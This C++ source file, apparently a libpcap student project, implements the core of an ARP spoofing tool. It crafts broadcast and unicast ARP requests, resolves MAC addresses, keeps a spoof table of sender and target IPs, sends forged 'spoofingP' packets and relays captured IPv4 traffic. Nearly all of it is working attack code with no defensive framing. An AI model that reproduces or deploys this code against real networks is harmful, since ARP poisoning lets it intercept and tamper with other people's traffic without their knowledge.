#include "arp.h"

EthArpPacket makeArpBRequestPacket(Mac sMac, Ip sIp, Ip tIp){
    EthArpPacket packet;
    packet.eth_.smac_ = sMac;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = sMac;
    packet.arp_.sip_ = htonl(sIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(tIp);

    return packet;
}

bool checkArp(std::map<Ip, Ip> spoofTable, const u_char* pkt_data, Ip& sip, Ip& tip){
    struct EthHdr *eh = (struct EthHdr*)pkt_data;
    if (eh->type() == 0x0806){
        struct ArpHdr *ah = (struct ArpHdr*)(eh+1);
        Ip sIp = ah->sip();
        auto ipPair = spoofTable.find(sIp);
        if (ipPair != spoofTable.end()) {
            sip = sIp;
            tip = ipPair->second;
            return true;
        }
    }
    return false;
}

bool checkAndSendIp(pcap_t* handle, const struct pcap_pkthdr *pkthdr, const u_char* pkt_data){
    struct EthHdr *eh = (struct EthHdr*)pkt_data;
    if (eh->type() == EthHdr::Ip4){
        //struct IpHdr *ih = (struct IpHdr*)(eh+1);
        //eh->smac_ = myMac;
        //eh->dmac_ = tMac;
        pcap_sendpacket(handle, pkt_data, pkthdr->caplen);
        return true;
    }
    return false;
}

Mac getSenderMac(const u_char* pkt_data){
    struct EthHdr *eh = (struct EthHdr*)pkt_data;
    struct ArpHdr *ah = (struct ArpHdr*)(eh+1);
    return ah->smac();
}

EthArpPacket makeArpURequestPacket(Mac sMac, Mac tMac, Ip sIp, Ip tIp){
    EthArpPacket packet;
    packet.eth_.smac_ = sMac;
    packet.eth_.dmac_ = tMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = sMac;
    packet.arp_.sip_ = htonl(sIp);
    packet.arp_.tmac_ = tMac;
    packet.arp_.tip_ = htonl(tIp);

    return packet;
}

void waitReply(u_char* param, const struct pcap_pkthdr* header, const u_char* pkt_data){
    struct EthHdr *eh = (struct EthHdr*)pkt_data;
    if (eh->type() == EthHdr::Arp){
        struct ArpHdr *ah = (struct ArpHdr*)(eh+1);
        arpRequestData* arData = reinterpret_cast<arpRequestData*>(param);
        if (ah->sip() == arData->findIp){
            arData->findMac = getSenderMac(pkt_data);
            pcap_breakloop(arData->handle);
        }
    }
    return;
}

Mac findMac(pcap_t* handle, std::map<Ip, Mac> arpTable, Ip fip, Mac myMac, Ip myIp){
    auto arpPair = arpTable.find(fip);
    if (arpPair != arpTable.end()){
        return arpPair->second;
    } else {
        EthArpPacket pkt = makeArpBRequestPacket(myMac, myIp, fip);
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        // Receive ARP Reply
        arpRequestData arData;
        arData.handle = handle;
        arData.findIp = fip;
        pcap_loop(handle, 0, waitReply, reinterpret_cast<u_char*>(&arData));
        return arData.findMac;
    }
}

bool sendArpURequest(pcap_t* handle, Mac sMac, Mac tMac, Ip sIp, Ip tIp){
    EthArpPacket spoofingP = makeArpURequestPacket(sMac, tMac, sIp, tIp);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofingP), sizeof(EthArpPacket));
    if (res != 0) {
        return false;
    }
    return true;
}
